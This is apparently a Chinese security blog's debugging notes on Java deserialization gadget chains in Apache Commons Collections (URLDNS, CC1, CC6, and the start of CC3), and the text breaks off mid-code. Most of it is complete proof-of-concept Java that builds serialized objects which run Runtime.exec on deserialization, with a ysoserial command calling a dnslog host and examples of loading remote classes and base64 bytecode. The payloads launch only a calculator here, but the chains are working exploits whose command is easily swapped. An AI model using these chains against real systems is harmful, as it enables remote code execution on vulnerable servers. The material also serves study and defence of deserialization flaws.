---
title: "ApacheCommonsCollections利用链乱记"
date: 2021-10-04T23:16:46+08:00
draft: false
image: https://commons.apache.org/proper/commons-collections/images/commons-logo.png
description: 
comments: true
license: false
math: false
categories:
- note
tags:
- Java
- 反序列化
---

这是一篇流水账，主要是记录下调试过程

cc链的gadget：

![CC.png](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191531135.png)

## URLDNS利用链

[URLDNS利用链](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)特点：

- 使用Java内置的类构造，对第三方库没有依赖
- 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞
- 比CommonCollection简单更容易上手

我们可以构造一个反序列化点：

```java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class Helloworld{
    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("yso.bin"));
        ois.readObject();
    }
}
```

使用新下载的jar包生成反序列化payload：

```
java -jar ysoserial-master-d367e379d9-1.jar URLDNS "http://kopboi.dnslog.cn" > yso.bin
```

运行即可看到dnslog的请求记录；

在Hashmap类的readObject方法putVal()处下断点：

![image-20210726103357827](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191520228.png)

最终在这里产生了DNS请求

![image-20210726104033123](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191520567.png)

Gadget：

```
HashMap.readObject->HashMap.hash()->URL.hashCode()->URLStreamHandler.hashCode()->URL.getHostAddress()->InetAdress.getByName()
```

但是如果是使用ysoserial生成反序列化数据的话，为啥不会产生DNS请求呢？

原因是在实例化URL类的时候，在这里handler传入了自定义的handler，这里面重写了`getHostAddress()`所以不会产生DNS请求

![image-20210726094111437](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191520648.png)

在`getHostAddress`方法的时候就会直接return null

![image-20210726100205964](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191520465.png)

### Poc

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.Base64;

public class urldns {
    public static void main(String[] args) throws Exception {

        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u){
                return null;
            }
        };

        HashMap hm = new HashMap();
        URL url = new URL(null,"http://114.hsr2k5.dnslog.cn\n",handler);
        hm.put(url,url);

        //Reflections.setFieldValue(url,"hashCode",-1);
        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hm);
        oos.close();
        //序列化流写入文件
        try
        {
            FileOutputStream fileOut = new FileOutputStream("D:\\tmp\\e.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(hm);
            out.close();
            fileOut.close();
            System.out.println("Serialized data is saved in D:\\tmp\\e.ser");
        }catch(IOException i)
        {
            i.printStackTrace();
        }
        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

## CC1 反序列化链

[https://www.mi1k7ea.com/2019/02/06/Java反序列化漏洞/](https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

https://pplsec.github.io/2018/08/20/Commons-Collections-JAVA-Unserialize/

踩坑：cc1必须使用[cc3.1的库](https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1)，如果调用commons-collection4的话会失败

### 漏洞点

Apache Commons Collections中有一个特殊的接口Transformer

```java
public interface Transformer { 
    public Object transform(Object input);
}
```

InvokerTransformer是实现了Transformer接口的一个类，这个类可以可以通过Java的反射机制来调用任意函数

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
}
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
          // 获取输入类的类对象
        Class cls = input.getClass();

          // 通过输入的方法名和方法参数，获取指定的反射方法对象
        Method method = cls.getMethod(iMethodName, iParamTypes);

          // 反射调用指定的方法并返回方法调用结果
        return method.invoke(input, iArgs);

    } catch (Exception ex) {
        // 省去异常处理部分代码
    }
}
```

可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在

#### 几个涉及到的类和接口

- **Transformer**
  
    Transformer是⼀个**接口**，它只有⼀个待实现的方法，作用是给定一个Object对象经过转换后同时也返回一个Object：
    
    ```java
    public interface Transformer { 
        public Object transform(Object input);
    }
    ```
    
- **ConstantTransformer**
  
    ConstantTransformer是实现了Transformer接口的⼀个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回：
    
    ```java
    public ConstantTransformer(Object constantToReturn) { 
        super(); 
        iConstant = constantToReturn;
    }
    public Object transform(Object input) { 
        return iConstant;
    }
    ```
    
- **InvokerTransformer**
  
    上文提到过了，可以通过反射执行任意方法的关键类
    
- **ChainedTransformer**
  
    ChainedTransformer也是实现了Transformer接口的一个类，它的作⽤是将内部的多个Transformer串在一起。
    
    我们只需要传入一个`Transformer`数组`ChainedTransformer`就可以实现依次的去调用每一个`Transformer`的`transform`方法。
    
    通俗来说就是，**前一个回调返回的结果，作为后⼀个回调的参数传入**
    

* * *

- **TransformedMap**
  
    TransformedMap用于对Java标准数据结构Map做一个修饰，
    
    被修饰过的Map在添加新的元素时，将可以执行一个调用（调用一个实现了Transformer接口的对象）。
    
    **只要调用`TransformedMap`的`setValue/put/putAll`中的任意方法都会调用`InvokerTransformer`类的`transform`方法，从而也就会触发命令执行**
    
    我们通过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map:
    
    ```java
    Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);
    ```
    
- **LazyMap**
  
    **LazyMap是在其get方法中执行的 factory.transform** 。
    
    ```java
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
    ```
    
    其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值
    

### 寻找调用

我们既然想要调用InvokerTransformer.transform()，我就需要寻找其他类有没有`可控对象.transform()`这种调用，搜索可以得到比较明显的两个：

- TransformedMap：

```java
public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {
//……
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
}
//AbstractInputCheckedMapDecorator.java：
public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
}
```

- Lazymap:

```java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    public Object get(Object key) {
    // create value for key if key is not currently in the map 
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key); 
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

### TransformedMap调用链

#### Demo

p神知识星球的demo：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"C:\\Windows\\System32\\calc.exe"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

如果熟悉几个类的作用，理解这个demo就很简单了：

1.  先创建一个ChainedTransformer对象，
2.  第一个参数是ConstantTransformer对象来获取Runtime对象
3.  第二个参数InvokerTransformer对象执行Runtime.exec方法
4.  最后通过向`TransformedMap.decorate`装饰过后的Map添加元素来触发transform回调ChainedTransformer构造好的chain

但是这个demo是存在问题的：

第二步`Runtime.getRuntime()`获取到的是一个Runtime对象，但是这个对象本身是没有实现`Serializable`接口的，序列化时会导致失败。

所以上述demo应当改为：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

1.  构造一个`ConstantTransformer`对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象；
2.  构造一个`InvokerTransformer`对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象；
3.  构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象；
4.  构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用；
5.  最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。

在这个demo当中，通过手动调用`outerMap.put`方法来触发`transform`回调，但是在实战当中，我们需要寻找在反序列化过程中会有类似操作的一个类；

#### AnnotationInvocationHandler构造触发点

> 此类在jdk8u71之后删除了memberValue.setValue()，所以利用版本需要jdk<8u71，这里使用jdk8u60

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(Java动态代理)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用。

这里的memberValues是经过`var1.defaultReadObject()`得来的，也就是我们构造好的带有恶意攻击链的`TransformedMap`对象

![image-20210728140556468](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191531675.png)

要进入到setValue，需要让var7不为null，只需要满足以下两个条件：

1.  `sun.reflect.annotation.AnnotationInvocationHandler`构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X
    
2.  被`TransformedMap.decorate`修饰的Map中必须有一个键名为X的元素
    

经过多次步入，我们可以跟进到了我们熟悉的ChainedTransformer：

![image-20210728115233758](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191531053.png)

通过for循环使前一个Transformer返回的object传入下一个Transformer的transform方法

接下来就是熟悉的通过InvokerTransformer反复去反射Runtime的方法最后执行exec

![image-20210728120142154](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191531475.png)

#### Poc

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;


class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        /*构造恶意链*/
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] { String.class },
                new String[] {"calc.exe" }),
        };
        
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        
        /*构造AnnotationInvocationHandler对象
        反序列化时执行其readObject调用TransformedMap.setValue触发恶意链*/
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);	//满足进入到setValue的条件
        
        /*构造序列化流*/
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        /*反序列化*/
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
        }
}
```

### Lazymap调用链

[P神知识星球\[代码审计\]Java安全漫谈 - 11.反序列化篇(5)](https://t.zsxq.com/a2JUZVv)

LazyMap和TransformedMap类似，都来自于Commons-Collections库，并继承AbstractMapDecorator。

LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而**LazyMap是在其get方法中执行的 factory.transform** 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：

```java
    public Object get(Object key) {
    // create value for key if key is not currently in the map 
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key); 
            map.put(key, value);
            return value;
    	}
        return map.get(key);
    }
```

相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些。

原因是在`sun.reflect.annotation.AnnotationInvocationHandler`的`readObject`方法中并没有直接调用到Map的get方法。

所以ysoserial找到了另一条路，`AnnotationInvocationHandler类`的`invoke`方法有调用到get：

![image-20210728152028408](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191531558.png)

但是我们应该如何去调用到invoke方法呢？这里插一个知识点：

#### Java动态代理

https://zhuanlan.zhihu.com/p/42516717

Java作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP `__call`的魔术方法，要用到`java.reflect.Proxy` ：

```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
```

`Proxy.newProxyInstance` 的第一个参数是ClassLoader，我们用默认的即可；

第二个参数是我们需要代理的对象集合；

第三个参数是一个实现了InvocationHandler接口的对象（就是我们自己写的），里面包含了具体代理的逻辑。

举个例子，写一个ExampleInvocationHandler劫持Hashmap的get方法：

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;

    public ExampleInvocationHandler(Map map) {
        this.map = map;
    }
    /*劫持get方法*/
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0) {
            System.out.println("Hook method: " + method.getName());
            return "Hacked Object";
        }
        return method.invoke(this.map, args);
    }
}

class App {
    public static void main(String[] args) throws Exception {
        InvocationHandler handler = new ExampleInvocationHandler(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        proxyMap.put("hello", "world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);
    }
}
```

我调用`proxyMap.get("hello")`本来应该得到'world'，但是经过代理，得到"Hacked Object"

![image-20210728160825189](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532224.png)

我们回看`sun.reflect.annotation.AnnotationInvocationHandler`，会发现实际上这个类实际就是一个`InvocationHandler`。

我们如果将这个对象用Proxy进行代理，那么在`readObject`的时候，只要调用任意方法，就会进入到`AnnotationInvocationHandler#invoke`方法中，进而触发我们的get

#### Poc

直接看注释就懂：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

class CC1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] { "calc.exe" }),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        /*获得AnnotationInvocationHandler的构造方法*/
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        /*相当于AnnotationInvocationHandler代理任意对象，只要那个对象反序列化时readObject调用任意方法就会触发invoke*/
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        /*因为我们入口点是AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹*/
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        /*构造序列化*/
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        /*反序列化*/
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

其实就是`AnnotationInvocationHandler`对象代理他自己，被代理的那个AnnotationInvocationHandlerread对象的Object触发代理的invoke

## CC6 反序列化链

### 分析

在cc1里面提到过用`AnnotationInvocationHandler`构造触发点：

> 此类在jdk8u71之后删除了memberValue.setValue()，所以利用版本需要jdk<8u71，这里使用jdk8u60

为了解决这个问题，我们需要放弃这个触发点进而寻找其他调用`LazyMap#get()`的地方

答案就是`org.apache.commons.collections.keyvalue.TiedMapEntry`，这个类的getValue方法调用了map.get()

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {

    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;
    
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return key;
    }

    public Object getValue() {
        return map.get(key);
    }

    public Object setValue(Object value) {
        if (value == this) {
            throw new IllegalArgumentException("Cannot set value to this map entry");
        }
        return map.put(key, value);
    }
    
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
    
    public String toString() {
        return getKey() + "=" + getValue();
    }

}
```

而同类的hashCode()又调用了getValue()，所以只要找到一个`可控对象.hashCode()`调用

如果跟过URLDNS链，熟悉HashMap的话，会发现其实`HashMap#hash()`里面有很多调用`可控对象#hashCode()`的地方

当然，在`java.util.HashMap#readObject` 也很容易找`HashMap#hash(key)`这样的调用，找到了readObject就找到了反序列化的入口。

（其实就和URLDNS一样的`putVal(hash(key), key, value, false, false);`那一行）

### Gadget

HashMap#readObject->HashMap#hash->TiedMapEntry#hashCode()->TiedMapEntry#getValue()->LazyMap#get->……

### poc

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

class CommonsCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "calc.exe" }),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");	//为了调用hashCode()

        outerMap.remove("keykey");		//因为LazyMap触发要求是获取不到这个value，所以要删除

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        // 本地测试触发
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

个人认为有些难理解的点：

- 关于TiedMapEntry的意义
  就像名字一样，"tied"，意在绑定一个map里面的一个key，操作这个对象就相当于操作这个key对应的value，仔细翻阅源码就知道

- `expMap.put(tme, "valuevalue");`

  这个一开始看的时候很奇怪，怎么看都看不懂，为啥能把一个对象put到一个map的value里面呢？
  如果理解的第一点，这个就迎刃而解了。
  你把东西put进去始终是要对他进行操作（get，set等）的，put一个TiedMapEntry对象进去就是相当于可以操作绑定的key对应的value
  这里相当于给outerMap的键`keykey`设置了一个值`valuevalue`

- `outerMap.remove("keykey");`

  因为LazyMap里面get方法触发`可控对象.transform`要求是获取不到这个value，否则就触发不了，所以要删除

  ![image-20210804170742116](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532839.png)



## CC3 反序列化链

### Java动态加载字节码

> *可以参考“Java简单特性”一文的"类加载机制"*

在Java简单特性里面提到过：

> Java程序在运行前需要先编译成`.class`文件。
> 
> Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法(`defineClass0/1/2`)来定义一个`java.lang.Class`实例

实际上，不论用什么语言写源码，只要能编译成`.class`文件，都可以在JVM里面加载运行。

#### 利用URLClassLoader加载远程class文件

Java默认类加载器是Application ClassLoader，URLClassLoader是他的父类；

`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar或者class来实现远程的类方法调用

直接看个demo：

```java
import java.net.URL;
import java.net.URLClassLoader;
class HelloClassLoader {
    public static void main( String[] args ) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class c = loader.loadClass("HelloWorld");
        c.newInstance();
    }
}
```

可以成功加载本地服务的类

![image-20210805140305820](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532539.png)

#### 利用ClassLoader#defineClass直接加载字节码

在"Java简单特性"一文的"类加载流程"里面说过了，Java加载任何类都要经过

```
ClassLoader#loadClass -> ClassLoader#findClass -> ClassLoader#defineClass
```

其中：

- `loadclass`是从已加载的类缓存、父加载器等位置寻找类(这里实际上是双亲委派机制) ,在前面没有找到的情况下，执行findclass
  
- `findClass`是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass
  
- `defineClass`是处理前面传入的字节码，将其处理成真正的Java类
  

真正处理字节码的其实是defineClass，默认的`ClassLoader#defineClass`是一个内嵌在JVM中C实现的native方法。

直接调用ClassLoader#defineClass加载字节码的demo：

```java
import java.lang.reflect.Method;
import java.util.Base64;

class HelloDefineClass {
    public static void main(String[] args) throws Exception {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code, 0, code.length);
        hello.newInstance();
    }
}
```

![image-20210805143152300](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202109191532454.png)

但是问题就是`ClassLoader#defineClass`被调用的时候，类的对象不会被初始化，必须对象显式调用构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，**如果我们要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数**。

在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它,但它却是我们常用的一个攻击链`TemplatesImpl`的基石。

#### 利用TemplatesImpl加载字节码

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类中定义了一个内部类 `TransletClassLoader`，它重写了defineClass方法，而且没有声明作用域（那就是default），即可被同一个包的类调用。

从`TransletClassLoader#defineClass()`向前追溯一下调用链：

```java
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()
-> TransletClassLoader#defineClass()
```

最前面两个`TemplatesImpl#getOutputProperties()` 和 `TemplatesImpl#newTransformer()`是public，就可以被外部调用。

另外，`TemplatesImpl`中对加载的字节码是有一定要求的：这个字节码对应的类必须 是`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`的子类。

我们在构造的时候需要继承这个类：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.lang.Runtime;

public class HelloTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public HelloTemplatesImpl() {
        super();
        System.out.println("Hello TemplatesImpl");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

强调一点：一定要`public class`，不然只能玩蛇。

在多个Java反序列化利用链，以及`fastjson`、`jackson`的漏洞中，都曾出现过`TemplatesImpl的`身影

### CC3(利用InvokerTransformer)

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.util.Base64;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

class CommonsCollectionsIntro3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
